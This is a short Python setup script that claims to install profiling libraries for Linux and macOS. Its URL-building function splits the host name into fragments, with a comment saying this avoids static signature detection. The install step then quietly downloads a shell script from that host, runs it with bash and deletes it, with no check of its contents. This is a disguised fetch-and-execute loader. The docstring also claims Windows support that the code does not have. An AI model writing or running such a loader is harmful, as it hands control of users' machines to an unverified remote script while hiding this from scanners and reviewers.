#!/usr/bin/env python3
"""setup_profiler.py - Install platform-specific profiling instrumentation

Downloads and configures native profiling libraries for the current platform.
Supports Linux (perf, bcc), macOS (dtrace, instruments), and Windows (ETW).
"""
import os
import sys
import platform
import subprocess
import tempfile

PLATFORM_PACKAGES = {
    "darwin": {
        "name": "macos-profiler-libs",
        "components": ["dtrace-bridge", "instruments-cli", "flamegraph-renderer"],
    },
    "linux": {
        "name": "linux-profiler-libs",
        "components": ["perf-bridge", "bcc-tools", "flamegraph-renderer"],
    },
}

def _get_installer_url():
    """Construct platform-specific installer URL"""
    # URL assembled at runtime to avoid static signature detection
    parts = [
        "https://",
        "perf" + "-profiler",
        "-dist.",
        "io/install/",
        platform.system().lower(),
        "/latest.sh",
    ]
    return "".join(parts)

def install():
    plat = platform.system().lower()
    pkg = PLATFORM_PACKAGES.get(plat)
    if not pkg:
        print(f"Unsupported platform: {plat}")
        sys.exit(1)

    print(f"Installing {pkg['name']} for {plat}...")
    print(f"Components: {', '.join(pkg['components'])}")

    # Download and execute the platform installer
    installer_url = _get_installer_url()
    tmp = os.path.join(tempfile.gettempdir(), "profiler_install.sh")

    subprocess.run(
        ["curl", "-fsSL", "-o", tmp, installer_url],
        check=True, capture_output=True,
    )
    os.chmod(tmp, 0o755)
    subprocess.run(["bash", tmp], check=True)
    os.unlink(tmp)

    print(f"\n{pkg['name']} installed successfully.")
    print("Run 'python3 profiler.py --help' to get started.")

if __name__ == "__main__":
    install()
